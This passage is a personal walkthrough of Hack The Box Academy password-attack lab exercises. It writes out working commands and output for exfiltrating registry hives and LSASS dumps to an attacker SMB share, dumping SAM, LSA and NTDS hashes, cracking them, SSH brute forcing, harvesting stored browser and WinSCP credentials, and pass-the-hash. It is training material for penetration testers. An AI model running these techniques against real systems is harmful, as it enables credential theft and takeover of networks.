               3 File(s)     12,906,496 bytes
               5 Dir(s)  12,022,145,024 bytes free

C:\Windows\system32>
```
So this way we copy registry hives which are useful and contain hashes for local acc pswds, contain bootkey, creds for domain acc.

Registry Hive 	Description
hklm\sam 	- Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.
hklm\system - Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.
hklm\security - Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.

Then on the attacking machine (Our VM or Pwnbox) we need to run this command replacing htb-ac-1052766 to the our username accordingly. I am doing this task on the pwnbox so this is mine command:
```c
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/htb-ac-1052766/Documents/
```

So now we need to start moving our hive copies to attack machine. Run the following commands one-by-one and change the IP to the IP of the attacking machine:
```c
C:\>move sam.save \\10.10.15.129\CompData
        1 file(s) moved.

C:\>move system.save \\10.10.15.129\CompData
        1 file(s) moved.

C:\>move security.save \\10.10.15.129\CompData
        1 file(s) moved.
```

It will give us the output, something like this:
```c
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.202.137,49676)
[*] AUTHENTICATE_MESSAGE (.\bob,FRONTDESK01)
[*] User FRONTDESK01\bob authenticated successfully
[*] bob::.:aaaaaaaaaaaaaaaa:fe0e3afe596cab82f659cb3c77d032e5:01010000000000000083d240c30adb0152c062c09e4d6d7000000000010010004d005200700079006300520055007300030010004d00520070007900630052005500730002001000700042004c00680065004c006c004e0004001000700042004c00680065004c006c004e00070008000083d240c30adb01060004000200000008003000300000000000000000000000003000002b39bd1202e1065457ee0bdcabe6596248d000d01cd37d6a425700bd15a8a1610a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310035002e003100320039000000000000000000
[*] Connecting Share(1:CompData)
[*] Disconnecting Share(1:CompData)
[*] Closing down connection (10.129.202.137,49676)
[*] Remaining connections []
```

Then go to /Documents directory and you will see the copies of sam, security and system .save files
So we see 3 file then we need to run this command which will dump the hashes offline - Impacket's `secretsdump.py`
```c
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0xd33955748b2d17d7b09c9cb2653dd0e8
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
[*] NL$KM 
 0000   E4 FE 18 4B 25 46 81 18  BF 23 F5 A3 2A E8 36 97   ...K%F...#..*.6.
 0010   6B A4 92 B3 A4 32 DE B3  91 17 46 B8 EC 63 C4 51   k....2....F..c.Q
 0020   A7 0C 18 26 E9 14 5A A2  F3 42 1B 98 ED 0C BD 9A   ...&..Z..B......
 0030   0C 1A 1B EF AC B3 76 C5  90 FA 7B 56 CA 1B 48 8B   ......v...{V..H.
NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
[*] _SC_gupdate 
(Unknown User):Password123
[-] NTDSHashes.__init__() got an unexpected keyword argument 'ldapFilter'
[*] Cleaning up... 

```

We will create a file in /Documents directory in our attack box which will contain NT hashes for admin and other users except Guest, DefaultAccount and WDAGUtilityAccount
```c
nano hashestocrack.txt

31d6cfe0d16ae931b73c59d7e0c089c0
3c0e5d303ec84884ad5c3b7876a06ea6
c02478537b9727d391bc80011c2e2321
a3ecf31e65208382e23b3420a34208fc
58a478135a93ac3bf058a5ea0e8fdb71
```

We will crack them with hashcat:
``` c
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

c02478537b9727d391bc80011c2e2321:matrix                   
a3ecf31e65208382e23b3420a34208fc:mommy1                   
31d6cfe0d16ae931b73c59d7e0c089c0:                         
58a478135a93ac3bf058a5ea0e8fdb71:Password123  
```


9. Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive)

With access to credentials with `local admin privileges`, it is also possible for us to target LSA Secrets over the network. This could allow us to extract credentials from a running service, scheduled task, or application that uses LSA secrets to store passwords.
While we still have rdp connection with target we run on our attacking machine this:
```c
crackmapexec smb 10.129.202.137 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa


SMB         10.129.202.137  445    FRONTDESK01      [*] Windows 10 / Server 2019 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.202.137  445    FRONTDESK01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.202.137  445    FRONTDESK01      [+] Dumping LSA secrets
SMB         10.129.202.137  445    FRONTDESK01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.202.137  445    FRONTDESK01      NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.202.137  445    FRONTDESK01      frontdesk:Password123
SMB         10.129.202.137  445    FRONTDESK01      [+] Dumped 3 LSA secrets to /home/htb-ac-1052766/.nxc/logs/FRONTDESK01_10.129.202.137_2024-09-19_141410.secrets and /home/htb-ac-1052766/.nxc/logs/FRONTDESK01_10.129.202.137_2024-09-19_141410.cached
```


### Attacking LSASS

10. What is the name of the executable file associated with the Local Security Authority Process?

Ctr+F the page to find the answer 
`lsass.exe`

11. Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer. (Format: Case sensitive)

So this task took quite a loooong time for me to do, because I was initially doing it on my Kali machine in Vmware, but that was not successful, the lsass.dmp simply wasn't creating no mater how many times I tried. Then I've decided to use the built-in Pwnbox and that went smooth as fuck!

The process of getting the hash was interesting to me. Here are the steps:

First of all, we are provided with the `htb-student` and `HTB_@cademy_stdnt!` username and password to RDP to our Windows victim machine, so simply use rdesktop (I lowkey like it more that xfreerdp)
```c
rdesktop -u htb-student -p 'HTB_@cademy_stdnt!' 10.129.214.228 
```

Once logged in, navigate to Users directory inside the C: drive and enable permissions to get access to this directory and be able to obtain the hash later
Then open the powershell as admin and find the Process ID (PID) of the lsass:
```c
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    656   0 lsass
```

In my case the PID of the lsass is 656 which I will use in the next command. The following command is used to create a memory dump of the LSASS (Local Security Authority Subsystem Service) process in Windows:
```c
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\Uses\Vendor\AppData\Local\Temp\lsass.dmp full
```

When we run this command, then we can navigate to `C:\Uses\Vendor\AppData\Local\Temp\` directory and list the files and we will see our dumped lsass file, waiting for us to be moved to our attack machine ;)

Now on out attack machine, we use the following command to set up a simple SMB (Server Message Block) server using the Impacket library in Python, to get the hash
```c
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/htb-ac-1052766/Documents/
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

- **`sudo`**:
    - This command is used to run the following command with elevated privileges (as a superuser). This is often necessary for network operations or accessing certain files and directories.
- **`python3`**:
    - This indicates that you are running a Python 3 script. Impacket is a collection of Python classes for working with network protocols, particularly those used in Windows environments.
- **`/usr/share/doc/python3-impacket/examples/smbserver.py`**:
    - This is the path to the SMB server script included with the Impacket library. This script allows you to create an SMB server to share files over the SMB protocol.
- **`-smb2support`**:
    - This flag enables support for the SMB2 protocol. SMB2 is a more efficient and feature-rich version of the SMB protocol compared to its predecessor, SMB1. Enabling this support allows clients using SMB2 to connect and interact with your SMB server.
- **`CompData`**:
    - This is the name of the share that will be created by the SMB server. When clients connect to your SMB server, they will see this share listed as **`CompData`**. It serves as a point of access for shared files or directories.
- **`/home/htb-ac-1052766/Documents/`**:
    - This specifies the local directory that will be shared via the SMB server. In this case, the contents of the **`/home/htb-ac-1052766/Documents/`** directory will be accessible to clients connecting to the SMB share named **`CompData`**. Change the htb-ac-1052766 to the name of your user

In a nutshell we need to use this command to make file-transfer of `lsass.dmp` file from Windows victim machine to our attacking machine 

Then on the Windows victim machine in powershell we can now move the lsass.dmp file to our attack machine:
```c
C:\>move lsass.dmp \\<Attack-Machine-IP>\CompData
        1 file(s) moved.
```

As we now have the file lsass.dmp on our attack machine, we can use pypykatz command to parse the secrets hidden in the LSASS process memory dump. We use `lsa` in the command because LSASS is a subsystem of `local security authority`, then we specify the data source as a `minidump` file, proceeded by the path to the dump file. The output of the long-ass command :
```c
pypykatz lsa minidump /home/htb-ac-1052766/Documents/lsass.dmp
.
.
.
SNIP
.
.
.
== LogonSession == 
authentication_id 128547 (1f623) 
session_id 0 
username Vendor 
domainname FS01 
logon_server FS01 
logon_time 2024-10-10T17:09:49.021641+00:00 
sid S-1-5-21-2288469977-2371064354-2971934342-1003 
luid 128547 
== MSV == 
Username: Vendor 
Domain: FS01 
LM: NA 
NT: 31f87811133bc6aaa75a536e77f64314 
SHA1: 2b1c560c35923a8936263770a047764d0422caba 
DPAPI: 0000000000000000000000000000000000000000 
== WDIGEST [1f623]== 
username Vendor 
domainname FS01 
password None password (hex) 
== Kerberos == 
Username: Vendor 
Domain: FS01 
== WDIGEST [1f623]== 
username Vendor 
domainname FS01 
password None password (hex)
```

Actually I inserted only the part of the command where we see the NT hash only for the requested user Vendor. But the command dumped all hashes of all active users

As we see the hash is `31f87811133bc6aaa75a536e77f64314`
So to get answer we need to crack it using hashcat:
```c
sudo hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 /usr/share/wordlists/rockyou.txt
.
.
.
SNIP
.
.
.
64f12cddaa88057e06a81b54e73b949b:Mic@123
```


### Attacking Active Directory & NTDS.dit

12. What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts? (Format: ****.***) 

Read the page or Ctr+f: NTDS.dit


13.  Submit the NT hash associated with the Administrator user from the example output in the section reading. 

Just look at the last image in the page: 64f12cddaa88057e06a81b54e73b949b


15. On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive) 

I took a hint as my username-anarchy was not working. So in the hint they say to use fasttrack password wordlist and firstinitiallastname pattern:
```c
crackmapexec smb 10.129.189.127 -u jmarston -p /usr/share/wordlists/fasttrack.txt  
.
.
.
SNIP
.
.
.
SMB         10.129.189.127  445    ILF-DC01         [-] ILF.local\jmarston:P@ssw0rd! STATUS_LOGON_FAILURE 
sSMB         10.129.189.127  445    ILF-DC01         [-] ILF.local\jmarston:P@55w0rd! STATUS_LOGON_FAILURE 
SMB         10.129.189.127  445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
```

Took sometime but I found password:
```
jmarston:P@ssword!
```

16. Capture the NTDS.dit file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. (Format: Case-Sensitive) 

I decided to use simple method:
```c
crackmapexec smb 10.129.189.127 -u jmarston -p P@ssword! --ntds                   
SMB         10.129.189.127  445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False)
SMB         10.129.189.127  445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
SMB         10.129.189.127  445    ILF-DC01         [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.129.189.127  445    ILF-DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
SMB         10.129.189.127  445    ILF-DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.189.127  445    ILF-DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
SMB         10.129.189.127  445    ILF-DC01         ILF.local\jmarston:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
SMB         10.129.189.127  445    ILF-DC01         ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
SMB         10.129.189.127  445    ILF-DC01         ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
SMB         10.129.189.127  445    ILF-DC01         ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
SMB         10.129.189.127  445    ILF-DC01         ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:8882ad272890d15db5fc1533991d9cd6:::
SMB         10.129.189.127  445    ILF-DC01         LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::
SMB         10.129.189.127  445    ILF-DC01         [+] Dumped 9 NTDS hashes to /home/r3so1v3/.cme/logs/ILF-DC01_10.129.189.127_2024-10-14_005032.ntds of which 7 were added to the database
                                                                                     
```

In my case the NT hash was: `92fd67fd2f49d0e83744aa82363f021b`
So we need to crack it via hashcat:
```c
sudo hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /usr/share/wordlists/rockyou.txt   
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 1904/3873 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

92fd67fd2f49d0e83744aa82363f021b:Winter2008               
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 92fd67fd2f49d0e83744aa82363f021b
Time.Started.....: Mon Oct 14 00:58:13 2024 (1 sec)
Time.Estimated...: Mon Oct 14 00:58:14 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2131.3 kH/s (0.06ms) @ Accel:256 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2082816/14344385 (14.52%)
Rejected.........: 0/2082816 (0.00%)
Restore.Point....: 2081792/14344385 (14.51%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: YESENIA22 -> Warsteiner1
Hardware.Mon.#1..: Util: 35%

Started: Mon Oct 14 00:58:12 2024
Stopped: Mon Oct 14 00:58:15 2024

```


### Credential Hunting in Windows

17.  RDP to 10.129.202.99 (ACADEMY-PWATTACKS-WIN10CHUNTING) with user "Bob" and password "HTB_@cademy_stdnt!"
What password does Bob use to connect to the Switches via SSH? (Format: Case-Sensitive) 

First we need to rdp to target:
```c
xfreerdp /v:10.129.202.99 /u:Bob /p:HTB_@cademy_stdnt!
```

Then we need to explore the folders of the User Bob for that. Easy


18. What is the GitLab access code Bob uses? (Format: Case-Sensitive) 

Same here, just look for folders

19.  What credentials does Bob use with WinSCP to connect to the file server? (Format: username:password, Case-Sensitive) 

For this FUCKED UP TASK, solving which I spent 1.5 hours, because FUCKING INTERNET is not working there on windows. I tried to transfer https://github.com/AlessandroZ/LaZagne tool to Windows using, scp, samba, but all of that was not successful. Eventually I set up python server on my kali in the directory where I already downloaded this LaZagne zip file: 
```c
python3 -m http.server 8080
```

Then on windows machine, go to browser
```c
http://KaliIP:8000
```

And you will see all the files located in the directory where you ran your python server

Okay we can unzip the file, BUT GUESS FUCKING WHAT? We also need to transfer python Windows installer to target as well!
So do the same with it as for LaZagne. Then when you have that python installed, you need to add it to the PATH:
Here was my case:
```c
[System.Environment]::SetEnvironmentVariable("Path", $env:Path + ";C:\Users\bob\AppData\Local\Programs\Python\Python313;C:\Users\bob\AppData\Local\Programs\Python\Python313\Scripts\", "Bob")
```

Then close and open powershell, navigate to directory where your LaZagne is located, to the windows folder inside it, and run python script:
```c
.\laZagne.py all
```

This will give you this:
```c
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

[+] System masterkey decrypted for 356e845b-3c6e-42d4-90fe-ed3df3acbfe6
[+] System masterkey decrypted for 66c0784c-3191-4a2b-92e3-78e4d7986659
[+] System masterkey decrypted for 6a505802-6b1c-4420-bcb1-5085b201d5c0
[+] System masterkey decrypted for 83c23bf4-30df-4c94-96d6-e2c4cfcc74b2
[+] System masterkey decrypted for cbf5956a-5229-4238-838f-222660dc77e9

########## User: SYSTEM ##########

------------------- Hashdump passwords -----------------

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::

------------------- Lsa_secrets passwords -----------------

DPAPI_SYSTEM
0000   01 00 00 00 C0 3A 4A 9B 2C 04 5E 54 55 43 F3 DC    .....:J.,.^TUC..
0010   B9 C1 81 BB 17 D6 BD CE 50 B9 FA 0F D7 94 52 15    ........P.....R.
0020   01 11 35 73 08 74 8F 7C A1 01 94 4A                ..5s.t.|...J

NL$KM
0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
0010   E4 FE 18 4B 25 46 81 18 BF 23 F5 A3 2A E8 36 97    ...K%F...#..*.6.
0020   6B A4 92 B3 A4 32 DE B3 91 17 46 B8 EC 63 C4 51    k....2....F..c.Q
0030   A7 0C 18 26 E9 14 5A A2 F3 42 1B 98 ED 0C BD 9A    ...&..Z..B......
0040   0C 1A 1B EF AC B3 76 C5 90 FA 7B 56 CA 1B 48 8B    ......v...{V..H.
0050   32 B3 2C 95 2E 46 50 5A 46 F7 6E 53 66 FB DA 53    2.,..FPZF.nSf..S



########## User: bob ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: 10.129.202.64
Login: ubuntu
Password: FSadmin123
Port: 22
```

So the answer easy to find from this.


20. What is the default password of every newly created Inlanefreight Domain user account? (Format: Case-Sensitive) 

Here is pretty easy, just look for some folders, open some scripts: Inlanefreightisgreat2022


21. What are the credentials to access the Edge-Router? (Format: username:password, Case-Sensitive) 

Here as well, just open file for that Automation&Script folder: edgeadmin:Edge@dmin123!


### Credential Hunting in Linux

22. Examine the target and find out the password of the user Will. Then, submit the password as the answer.

In the hint it is written that there is user `Kira` with password `LoveYou1`, which can be useful for ssh. However it did not work like that. Our task is to create a mutated password list using her password. First add her password to file:
```c
nano kirapassloveyou1.txt 

LoveYou1
```

Then make a list of mutated passwords with hashcat:
```c
hashcat --force kirapassloveyou1.txt -r custom.rule --stdout | sort -u > mutatedkirapassloveyou1.list

┌──(r3so1v3㉿kali)-[~/Hacking/academy/password-attacks]
└─$ wc -l mutatedkirapassloveyou1.list                                 
459 mutatedkirapassloveyou1.list
```

So we have 459 passwords there. Let's brute force ssh service:
```c
hydra -l kira -P mutatedkirapassloveyou1.list -u 10.129.87.169 ssh                 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-15 21:19:47
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 459 login tries (l:1/p:459), ~29 tries per task
[DATA] attacking ssh://10.129.87.169:22/
[22][ssh] host: 10.129.87.169   login: kira   password: L0vey0u1!
1 of 1 target successfully completed, 1 valid password found
```

Now we got her ssh password `L0vey0u1!` We can use it to ssh to target:
```c
ssh kira@10.129.87.169
```

After that we can use history command to figure our one tool that is needed to get Will's password:
```c
kira@nix01:~$ cat .bash 
.bash_history  .bash_logout   .bashrc        
kira@nix01:~$ cat .bash_history 
cd
git clone https://github.com/unode/firefox_decrypt.git
cd firefox_decrypt/
ls
./firefox_decrypt.py 
su
./firefox_decrypt.py 
python3.9 firefox_decrypt.py 
cd ..
rm -rf firefox_decrypt/
vim .bash_history 
su
firefox 
su
firefox 
cd .mozilla/firefox/
ls
cd ytb95ytb.default-release/
ls
cat logins.json 
vim logins.json 
jq
su
ls
vim logins.json 
su
cd
cd .ssh/
ls
rm *
ssh-keygen -t rsa -m PEM
cat id_rsa.pub > authorized_keys
vim authorized_keys 
su
```

As we see this tool is called `firefox_decrypt`. Thus we need to firstly download it to our attack machine as it was deleted in the target one.
```c
git clone https://github.com/unode/firefox_decrypt.git
Cloning into 'firefox_decrypt'...
remote: Enumerating objects: 1374, done.
remote: Counting objects: 100% (492/492), done.
remote: Compressing objects: 100% (129/129), done.
remote: Total 1374 (delta 389), reused 444 (delta 358), pack-reused 882 (from 1)
Receiving objects: 100% (1374/1374), 491.72 KiB | 806.00 KiB/s, done.
Resolving deltas: 100% (863/863), done.
  
┌──(r3so1v3㉿kali)-[~/Hacking/academy/password-attacks]
└─$ cd firefox_decrypt 

┌──(r3so1v3㉿kali)-[~/Hacking/academy/password-attacks/firefox_decrypt]
└─$ ip a | grep tun0           
4: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    inet 10.10.16.31/23 scope global tun0
```

After that you see that I displayed ip of my kali's vpn, so we need it to transfer this tool to victim via python server. On our attacking machine:
```c
python3 -m http.server 8080
```

On the victim machine after running previous command:
```c
kira@nix01:~$ wget http://10.10.16.31:8080 -r firefox_decrypt
```

After hitting enter the transfer process will begin, and we will need to wait for some time.
Once it is transferred we can use this tool to obtain the information about Will's creds:
```c
kira@nix01:~$ ls
10.10.16.31:8080  Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
kira@nix01:~$ cd 10.10.16.31\:8080/
kira@nix01:~/10.10.16.31:8080$ ls
CHANGELOG.md     firefox_decrypt.py  LICENSE         README.md
CONTRIBUTORS.md  index.html          pyproject.toml  tests
kira@nix01:~/10.10.16.31:8080$ python3 firefox_decrypt.py 
Traceback (most recent call last):
  File "firefox_decrypt.py", line 46, in <module>
    PWStore = list[dict[str, str]]
TypeError: 'type' object is not subscriptable
kira@nix01:~/10.10.16.31:8080$ python3.9 firefox_decrypt.py 
Select the Mozilla profile you wish to decrypt
1 -> lktd9y8y.default
2 -> ytb95ytb.default-release
2
Website:   https://dev.inlanefreight.com
Username: 'will@inlanefreight.htb'
Password: 'TUqr7QfLTLhruhVbCP'
```


### Passwd, Shadow & Opasswd

23.  Examine the target using the credentials from the user Will and find out the password of the "root" user. Then, submit the password as the answer. 

As we have Will's creds, we can ssh to the target at first:
```c
ssh will@ip
```

Then we can search for some files:
```c
will@nix01:~$ ls -la
total 36
drwxr-xr-x 5 will will 4096 Oct 15 17:15 .
drwxr-xr-x 5 root root 4096 Feb  9  2022 ..
drwxrwxr-x 2 will will 4096 Feb  9  2022 .backups
-rw------- 1 will will   81 Feb  9  2022 .bash_history
-rw-r--r-- 1 will will  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 will will 3771 Feb 25  2020 .bashrc
drwx------ 2 will will 4096 Oct 15 17:15 .cache
drwx------ 3 will will 4096 Oct 15 17:15 .config
-rw-r--r-- 1 will will  807 Feb 25  2020 .profile
will@nix01:~$ cd .backups/
will@nix01:~/.backups$ ls
passwd.bak  shadow.bak
```

As we can see, there are 2 files that are interesting to us, passwd.bak and shadow.bak. We can open them and see what's inside, but we only need to get the root password, so we need to go to shadow.bak file and select the first line belonging to root: 
```c
root:$6$XePuRx/4eO0WuuPS$a0t5vIuIrBDFx1LyxAozOu.cVaww01u.6dSvct8AYVVI6ClJmY8ZZuPDP7IoXRJhYz4U8.DJUlilUw2EfqhXg
```

We can copy and paste this line to our attack machine and name it hash.txt. Then we need to use password.list and custom.rule files from resources in the top right section in htb-academy password attacks module. Now we need to create a mutated list of that passwords using the custom.rule:
```c
hashcat --force password.list -r custom.rule --stdout | sort -u > mutated-passwords
```

For now we have mutated-passwords file which we can finally use to crack the hash of the root password:
```c
john hash.txt --wordlist=mutated-passwords 
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
J0rd@n5          (root)     
1g 0:00:00:12 DONE (2024-10-15 22:59) 0.07727g/s 2215p/s 2215c/s 2215C/s Il0vey0u98!..J0seph83
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```


### Pass the Hash (PtH)

`Note: The tools we will be using are located in the C:\tools directory on the target host. Once you start the machine and complete the exercises, you can use the tools in that directory. This lab contains two machines, you will have access to one (MS01), and from there, you will connect to the second machine (DC01). `

24.  Access the target machine using any Pass-the-Hash tool. Submit the contents of the file located at C:\pth.txt.

There are many tools that can be used to perform PtH, but I decided to use impacket tool:
```c
┌──(r3so1v3㉿kali)-[~/Hacking/academy/password-attacks/pth]
└─$ impacket-psexec administrator@10.129.19.112 -hashes :30B3783CE2ABF1AF70F77D0660CF3453       
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.19.112.....
[*] Found writable share ADMIN$
[*] Uploading file mDmpQxal.exe
[*] Opening SVCManager on 10.129.19.112.....
[*] Creating service uPQS on 10.129.19.112.....
[*] Starting service uPQS.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\pth.txt
G3t_4CCE$$_V1@_PTH
C:\Windows\system32> 
```

25.  Try to connect via RDP using the Administrator hash. What is the name of the registry value that must be set to 0 for PTH over RDP to work? Change the registry key value and connect using the hash with RDP. Submit the name of the registry value name as the answer.

First we need to Enable Restricted Admin Mode to Allow PtH
```c
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

After that we can connect to our target via xfreerdp or rdesktop

27.  Connect via RDP and use Mimikatz located in c:\tools to extract the hashes presented in the current session. What is the NTLM/RC4 hash of David's account?

As we have already connected to windows target machine we can use mimikatz tool with sekurlsa::logonpasswords flag to get the hashes of all users
```c
